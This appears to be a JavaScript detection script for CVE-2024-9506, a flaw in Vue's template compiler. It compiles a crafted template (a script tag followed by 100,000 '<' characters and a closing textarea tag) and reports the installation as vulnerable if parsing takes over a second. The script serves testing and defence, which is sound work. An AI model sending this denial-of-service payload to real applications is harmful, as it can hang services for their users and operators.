function runTest() {
  if (!window.Vue) {
    console.error('❌ Vue is not available.')
    return
  }

  console.log('Vue version:', Vue.version)

  const payload = `
    <div>
      <script>${'<'.repeat(100000)}</textarea>
    </div>
  `

  let capturedMessage = ''

  const start = performance.now()

  suppressAndCapture(
    () => {
      Vue.compile(payload)
    },
    msg => {
      if (!capturedMessage) {
        
        capturedMessage = msg.slice(0, 50) + '...'
      }
    }
  )

  const duration = performance.now() - start

  if (capturedMessage) {
    const yellow = '\x1b[33m'
    const reset = '\x1b[0m'
    console.warn(`${yellow}[⚠️ Compile Warning]${reset} ${capturedMessage}`)
  }

  console.log('⏱ Time:', duration.toFixed(2), 'ms')

  const red = '\x1b[31m'
  const green = '\x1b[32m'
  const reset = '\x1b[0m'

  console.log(
    duration > 1000
      ? `${red}❗ VULNERABLE — CVE-2024-9506 triggered${reset}`
      : `${green}✅ Not vulnerable (fast parse)${reset}`
  )
}

function suppressAndCapture(fn, onMsg) {
  const originalWarn = console.warn
  const originalError = console.error

  console.warn = (msg, ...args) => {
    if (typeof onMsg === 'function') onMsg(msg)
  }

  console.error = (msg, ...args) => {
    if (typeof onMsg === 'function') onMsg(msg)
  }

  try {
    fn()
  } finally {
    console.warn = originalWarn
    console.error = originalError
  }
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', runTest)
} else {
  runTest()
}
